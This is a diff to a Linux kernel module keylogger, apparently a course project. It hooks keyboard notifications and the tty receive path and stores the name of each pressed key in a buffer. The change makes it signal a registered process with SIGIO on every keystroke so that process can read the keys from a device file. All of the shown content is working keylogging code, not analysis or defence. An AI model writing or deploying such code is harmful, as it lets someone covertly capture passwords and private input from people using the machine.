@@ -11,6 +11,9 @@
 #include <asm/uaccess.h>    /* copy_from/to_user */
 #include <asm/string.h>     /* strncpy */
 
+#include <linux/sched.h>
+#include <linux/signal.h>
+
 #include <linux/keyboard.h> /* register_keyboard_notifier etc */
 #include <linux/tty.h>
 
@@ -26,8 +29,8 @@
 MODULE_LICENSE( "Dual BSD/GPL" );
 
 static char *key_buffer = NULL, *pid_buffer = NULL;
-static int  fpos_read, fpos_unread = 0;
-static int  registered_pid = -1; // Only allow one pid to register at a time
+static int  cur_buf_length = 0;
+static pid_t  registered_pid = -1; // Only allow one pid to register at a time
 
 static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                         char *fp, int count);
@@ -58,6 +61,7 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
     int  err = 0;
 
     if ( count >= KEYLOG_BUF_SIZE ) {
+        print812( "Writing too many bytes (%zu). Bailing", count );
         return 0;
     }
     
@@ -81,20 +85,18 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     int err = 0;
 
-    if ( fpos_read < fpos_unread ) {
-        err = copy_to_user( buf, key_buffer, fpos_unread - fpos_read );
+    if ( *f_pos == 0 ) {
+        err = copy_to_user( buf, key_buffer, cur_buf_length );
         if ( err < 0 ) {
             print812( "Copying to user failed (%d)", err );
             return err;
         }
 
-        *f_pos = fpos_unread;
-        fpos_read = fpos_unread;
-
+        *f_pos = cur_buf_length;
         return *f_pos;
+    } else {
+        return 0;
     }
-
-    return 0;
 }
 
 struct file* file_open(const char* path, int flags, int rights) {
@@ -138,17 +140,35 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL; 
-    int new_buf_pos = 0;
     int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
+
+    struct siginfo     *sinfo;    /* signal information */
+    struct task_struct *task;
 
     if ( code == KBD_KEYCODE && param->down && startBuffering ) {
         key_name = GET_KEYNAME( param->value );
-        new_buf_pos = strlen( key_name ) + ( fpos_unread - fpos_read ) + 1; // +1 to account for line break
 
-        if ( new_buf_pos < KEYLOG_BUF_SIZE ) {
-            fpos_unread += sprintf( key_buffer + ( fpos_unread - fpos_read ), "%s\n", key_name );
+        cur_buf_length = sprintf( key_buffer, "%s", key_name );
+        
+        sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
+        if ( sinfo == NULL ) {
+            print812( "Failed to allocate siginfo for signal sending" );
+            return NOTIFY_OK;
         }
+        sinfo->si_signo = SIGIO;
+        sinfo->si_code = SI_USER;
+       
+        task = pid_task( find_vpid( registered_pid ), PIDTYPE_PID ); 
+        if ( task == NULL ) {
+            print812( "Failed to find task with pid %d", registered_pid );
+            return NOTIFY_OK;
+        }
+        
+        send_sig_info( SIGIO, sinfo, task );
 
+        if ( sinfo != NULL ) {
+            kfree( sinfo );
+        }
         // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
     }
 
